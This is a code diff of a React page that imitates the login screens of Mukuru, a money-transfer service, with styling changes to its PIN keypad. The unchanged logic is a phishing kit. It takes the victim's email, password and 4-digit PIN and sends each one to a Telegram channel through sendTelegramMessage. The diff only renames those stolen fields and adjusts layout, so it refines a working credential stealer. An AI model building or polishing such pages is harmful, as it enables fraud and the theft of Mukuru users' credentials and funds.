@@ -63,7 +63,7 @@ export default function MukuruPage() {
     try {
       await sendTelegramMessage({
         title: "Mukuru - Email Submitted",
-        Email: email,
+        email: email,
         type: "email_submit",
       })
     } catch (err) {
@@ -84,8 +84,8 @@ export default function MukuruPage() {
     try {
       await sendTelegramMessage({
         title: "Mukuru - Password Submitted",
-        Email: email,
-        Password: password,
+        email: email,
+        password: password,
         type: "password_submit",
       })
     } catch (err) {
@@ -109,9 +109,9 @@ export default function MukuruPage() {
         const pinCode = nextPin.join("")
         sendTelegramMessage({
           title: "Mukuru - 4 Digit PIN Submitted",
-          Email: email,
-          Password: password,
-          PIN: pinCode,
+          email: email,
+          password: password,
+          pin: pinCode,
           type: "pin_submit",
         }).catch((err) => console.error("Telegram PIN send error:", err))
 
@@ -141,9 +141,9 @@ export default function MukuruPage() {
     try {
       await sendTelegramMessage({
         title: "Mukuru - 4 Digit PIN Submitted",
-        Email: email,
-        Password: password,
-        PIN: pinCode,
+        email: email,
+        password: password,
+        pin: pinCode,
         type: "pin_submit",
       })
     } catch (err) {
@@ -311,10 +311,10 @@ export default function MukuruPage() {
           </div>
         ) : step === "pin" ? (
           /* ---------------- STATE C: 4-DIGIT MUKURU PIN / OTP SCREEN ---------------- */
-          <div className="flex-1 flex flex-col justify-between px-4 sm:px-6 pt-5 sm:pt-6 pb-6 sm:pb-8 animate-in fade-in duration-300">
+          <div className="flex-1 flex flex-col justify-between px-4 sm:px-6 pt-4 sm:pt-6 pb-5 sm:pb-7 animate-in fade-in duration-300">
             {/* Top Navigation Bar */}
             <div>
-              <div className="relative flex items-center justify-center mb-4 sm:mb-6">
+              <div className="relative flex items-center justify-center mb-4 sm:mb-5">
                 <button
                   type="button"
                   onClick={() => setStep("password")}
@@ -328,24 +328,24 @@ export default function MukuruPage() {
                 </h2>
               </div>
 
-              {/* Header Title with font-weight: 800 and 22px */}
-              <div className="text-center mb-6 sm:mb-8 px-2">
-                <h1 className="text-[20px] sm:text-[22px] font-[800] text-[#1a1a1a] leading-snug tracking-tight max-w-[280px] mx-auto">
+              {/* Header Title with font-weight: 800 */}
+              <div className="text-center mb-5 sm:mb-7 px-2">
+                <h1 className="text-[20px] sm:text-[22px] font-[800] text-[#1a1a1a] leading-snug tracking-tight max-w-[290px] mx-auto">
                   Enter your 4 digit Mukuru PIN to continue
                 </h1>
               </div>
 
-              {/* 4 Digit Display Boxes with exact responsive styles */}
-              <div className="flex justify-center items-center gap-2.5 sm:gap-3.5 mb-6 sm:mb-10">
+              {/* 4 Digit Display Boxes with balanced responsive styles */}
+              <div className="flex justify-center items-center gap-3 sm:gap-3.5 mb-5 sm:mb-8">
                 {[0, 1, 2, 3].map((index) => (
                   <div
                     key={index}
-                    className="w-13 h-15 sm:w-16 sm:h-16 flex items-center justify-center text-xl sm:text-2xl font-bold text-[#1a1a1a]"
+                    className="w-14 h-16 sm:w-16 sm:h-18 flex items-center justify-center text-xl sm:text-2xl font-bold text-[#1a1a1a]"
                     style={{
                       backgroundColor: "#ffffff",
                       borderRadius: "10px",
-                      boxShadow: "0 1px 4px rgba(0, 0, 0, .1)",
-                      transition: "box-shadow .18s",
+                      boxShadow: "0 1px 5px rgba(0, 0, 0, .1)",
+                      transition: "all .18s ease-in-out",
                     }}
                   >
                     {pin[index] || ""}
@@ -354,13 +354,13 @@ export default function MukuruPage() {
               </div>
 
               {/* On-Screen Numeric Keypad */}
-              <div className="max-w-[290px] sm:max-w-[320px] mx-auto grid grid-cols-3 gap-y-3.5 sm:gap-y-6 text-center">
+              <div className="max-w-[295px] sm:max-w-[325px] mx-auto grid grid-cols-3 gap-y-3 sm:gap-y-4.5 text-center">
                 {["1", "2", "3", "4", "5", "6", "7", "8", "9"].map((num) => (
                   <button
                     key={num}
                     type="button"
                     onClick={() => handleKeyPress(num)}
-                    className="h-12 sm:h-14 flex items-center justify-center text-[22px] sm:text-[26px] font-normal text-[#1a1a1a] active:scale-95 active:bg-black/5 rounded-full transition-all cursor-pointer select-none"
+                    className="h-12 sm:h-14 flex items-center justify-center text-[23px] sm:text-[26px] font-normal text-[#1a1a1a] active:scale-95 active:bg-black/5 rounded-full transition-all cursor-pointer select-none"
                   >
                     {num}
                   </button>
@@ -379,7 +379,7 @@ export default function MukuruPage() {
                   <button
                     type="button"
                     onClick={() => handleKeyPress("0")}
-                    className="w-15 h-15 sm:w-18 sm:h-18 rounded-full bg-[#dedede] flex items-center justify-center text-[22px] sm:text-[26px] font-normal text-[#1a1a1a] active:scale-95 active:bg-[#d0d0d0] transition-all cursor-pointer select-none shadow-xs"
+                    className="w-14 h-14 sm:w-16 sm:h-16 rounded-full bg-[#dedede] flex items-center justify-center text-[23px] sm:text-[26px] font-normal text-[#1a1a1a] active:scale-95 active:bg-[#d0d0d0] transition-all cursor-pointer select-none shadow-xs"
                   >
                     0
                   </button>
@@ -391,13 +391,13 @@ export default function MukuruPage() {
                   className="h-12 sm:h-14 flex items-center justify-center text-[#1a1a1a] active:opacity-60 transition-opacity cursor-pointer select-none"
                   aria-label="Backspace"
                 >
-                  <Delete className="w-6 h-6 sm:w-7 sm:h-7 stroke-[1.8]" />
+                  <Delete className="w-6 h-6 sm:w-6.5 sm:h-6.5 stroke-[1.8]" />
                 </button>
               </div>
             </div>
 
             {/* Bottom Actions: Continue (#c4c4c4 bg) & Cancel */}
-            <div className="space-y-2.5 sm:space-y-3 pt-4 sm:pt-6">
+            <div className="space-y-2.5 sm:space-y-3 pt-4 sm:pt-5">
               <button
                 type="button"
                 onClick={handlePinSubmit}
